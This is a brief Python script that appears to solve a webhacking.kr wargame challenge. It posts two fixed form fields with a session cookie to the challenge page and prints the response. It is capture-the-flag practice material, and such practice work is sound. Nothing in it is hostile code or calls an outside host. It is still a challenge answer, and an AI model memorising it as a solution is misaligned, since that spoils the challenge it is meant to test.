import requests

url = 'http://webhacking.kr/challenge/bonus/bonus-6/lv2.php'

cookies = {
	'PHPSESSID': ''
}

payloads = {
	'post': 'hehe',
	'post2': 'hehe2'
}

res = requests.post(url, cookies=cookies, data=payloads)
print(res.text)